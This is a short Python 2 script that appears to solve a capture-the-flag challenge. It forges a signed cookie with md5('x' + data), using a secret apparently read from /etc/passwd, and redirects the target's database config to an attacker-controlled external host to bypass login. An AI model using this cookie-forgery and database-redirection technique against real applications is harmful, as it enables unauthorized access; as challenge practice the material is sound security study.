import hashlib
import urllib

def generate_sig(data):
    # /etc/passwd doesn't store passwords, 'x' is the secret
    data = data.lower()
    return hashlib.md5('x' + data).hexdigest()

# Be lazy and create a db in db4free.net with table users and a single row: user=pedro, password=toto

# Obtain the correct cookie values
config = urllib.quote("db_name=testdb4242&db_user=test4242&db_host=db4free.net&db_passwd=testdb")
sig = generate_sig(config)

print 'config: {}\nsig: {}'.format(config, sig)

# Again, be lazy, edit the cookies in the browser using a chrome extension, and submit user=pedro, password=toto in the online form
